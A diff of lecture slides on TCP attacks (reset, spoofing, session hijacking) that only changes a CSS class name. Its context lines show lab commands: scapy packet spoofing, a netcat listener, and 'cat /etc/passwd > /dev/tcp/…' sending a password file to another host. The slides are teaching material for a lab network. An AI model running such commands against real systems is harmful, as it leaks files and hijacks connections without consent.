@@ -565,7 +565,7 @@ send(pkt,verbose=0)
 
 
 
-<!-- .slide: class="small-pre wide-pre" -->
+<!-- .slide: class="small-pre wider-pre" -->
 ## TCP Reset Attack
 ```
 root@outer1:/# tcpdump -i eth1 --absolute-tcp-sequence-numbers port telnet
@@ -697,7 +697,7 @@ sniff(filter='tcp and src host ...', prn=spoof_tcp)
 - We can write output to `/dev/tcp/(ip)/(port)`, and it will be sent, via TCP, to that host and port.
 - On outer1, run `nc -lnv 4760`.  On outer2:
 
-<pre class="code-wrapper wide-pre" style="margin-left:-50px;width:110%;"><code class="hljs language-elixir" data-highlighted="yes"
+<pre class="code-wrapper wider-pre" style="margin-left:-50px;width:110%;"><code class="hljs language-elixir" data-highlighted="yes"
   >root@outer2:/# cat /etc/passwd > /dev/tcp/192.168.100.101/4760
 root@outer2:/# 
 </code></pre>
@@ -749,7 +749,7 @@ cat /etc/passwd > /dev/tcp/192.168.100.101/4760
 
 
 
-<!-- .slide: class="small-pre wide-pre" -->
+<!-- .slide: class="small-pre wider-pre" -->
 ## tcpdump on *outer1*
 ```
 19:29:54.034748 IP outer1.44214 > outer3.telnet: Flags [P.], seq 2870849840:2870849842, 
